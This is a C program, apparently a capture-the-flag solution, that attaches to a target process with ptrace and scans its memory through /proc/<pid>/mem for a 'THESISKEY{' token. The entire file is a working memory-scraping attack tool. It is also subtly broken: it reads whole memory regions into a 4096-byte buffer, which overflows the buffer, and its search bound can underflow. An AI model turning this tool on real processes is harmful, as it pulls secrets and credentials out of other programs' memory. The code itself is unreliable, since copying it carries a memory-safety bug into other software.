#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    int target_pid = atoi(argv[1]);

    // Try to attach
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return 1;
    }

    sleep(1);  // Give it time to attach

    printf("[+] Attached to PID %d\n", target_pid);

    // Read from /proc/[pid]/mem
    char mem_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", target_pid);

    FILE* mem = fopen(mem_path, "rb");
    if (!mem) {
        perror("fopen /proc/pid/mem");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }

    // Read maps to understand memory layout
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", target_pid);
    FILE* maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen /proc/pid/maps");
        fclose(mem);
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }

    char line[512];
    char needle[] = "THESISKEY{";
    unsigned char buffer[4096];

    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[5];

        if (sscanf(line, "%lx-%lx %s", &start, &end, perms) < 3) {
            continue;
        }

        // Skip non-readable regions
        if (perms[0] != 'r') {
            continue;
        }

        // Limit to reasonable sizes
        if (end - start > 100 * 1024 * 1024) {
            continue;
        }

        // Read the region
        fseek(mem, start, SEEK_SET);
        size_t read = fread(buffer, 1, end - start, mem);

        // Search for token
        for (size_t i = 0; i < read - strlen(needle); i++) {
            if (memcmp(&buffer[i], needle, strlen(needle)) == 0) {
                // Found it, print up to the closing brace
                printf("[+] Found token at offset %lx!\n", start + i);
                for (size_t j = i; j < read && j < i + 200; j++) {
                    if (buffer[j] == '}') {
                        printf("%.*s}\n", (int)(j - i + 1), (char*)&buffer[i]);
                        goto done;
                    }
                }
            }
        }
    }

done:
    fclose(maps);
    fclose(mem);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    return 0;
}
